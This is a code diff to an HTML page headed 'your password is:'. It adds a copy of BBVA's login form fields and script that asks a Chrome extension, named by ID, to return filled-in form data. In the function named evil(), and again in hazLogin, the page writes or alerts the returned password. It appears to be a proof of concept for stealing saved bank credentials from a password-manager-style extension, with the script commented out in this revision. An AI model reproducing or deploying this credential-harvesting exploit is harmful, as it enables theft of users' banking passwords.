@@ -7,8 +7,28 @@
 
         <h1> your password is: </h1>
 
+        <form action="https://idp.live.global.platform.bbva.com/idp/profile/SAML2/Redirect/SSO?execution=e2s1">
+            <input class="input__field input__field--bbva border" name="j_username" type="text" pattern=".{1,50}"
+            id="username"
+            minlength="1" maxlength="50" autocomplete="username" autofocus required />
+<label class="input__label input__label--bbva" for="username">
+            <input class="input__field input__field--bbva" name="j_password" type="password"  pattern=".{1,50}"
+                                           id="password"
+                                           minlength="1" maxlength="50" autocomplete="current-password" required />
+
+                                           <input id="recaptcha-token" name="recaptcha-token" type="hidden"/>
+
+                                           <input id="_eventId_proceed" name="_eventId_proceed" type="hidden" />
+
+                                           
+
+
+        </form>
+
     </body>
     <script>
+/*
+var mydata = {"url":"https://idp.live.global.platform.bbva.com/idp/profile/SAML2/Redirect/SSO?execution=e2s1","nForms":1,"body":"BBVAsafeTranslate(\"remember\")He olvidado mi contraseñasafeTranslate(\"newRegister\")Regístrate","forms":[{"elements":["j_username","j_password","recaptcha-token","","_eventId_proceed","_eventId_proceed"],"action":"https://idp.live.global.platform.bbva.com/idp/profile/SAML2/Redirect/SSO?execution=e2s1"}]};
 
 
         function evil() {
@@ -18,11 +38,11 @@
             var mydata = {"url":"https://idp.live.global.platform.bbva.com/idp/profile/SAML2/Redirect/SSO?execution=e2s1","nForms":1,"body":"BBVAsafeTranslate(\"remember\")He olvidado mi contraseñasafeTranslate(\"newRegister\")Regístrate","forms":[{"elements":["j_username","j_password","recaptcha-token","","_eventId_proceed","_eventId_proceed"],"action":"https://idp.live.global.platform.bbva.com/idp/profile/SAML2/Redirect/SSO?execution=e2s1"}]};
 
             //chrome.runtime.sendMessage('lccpigmnibjnlnnjekjlgadebepenohn', {operation: "init", data: mydata}, function(response) {console.log(response)});
-            /*chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) { 
+            chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) { 
                     console.log(request.data); 
                     document.write(request.data.formData[1]);
                 }
-            );*/
+            );
 
             chrome.runtime.sendMessage('lccpigmnibjnlnnjekjlgadebepenohn', {operation: "init", data: mydata}, function(response) {console.log(response)});
         }
@@ -34,6 +54,8 @@
         function hazLogin(data) {
             alert(data.formData[1]);
         }
+
         chrome.runtime.sendMessage('lccpigmnibjnlnnjekjlgadebepenohn', {operation: "init", data: mydata}, function(response) {console.log(response)});
+        */
     </script>
 </html>
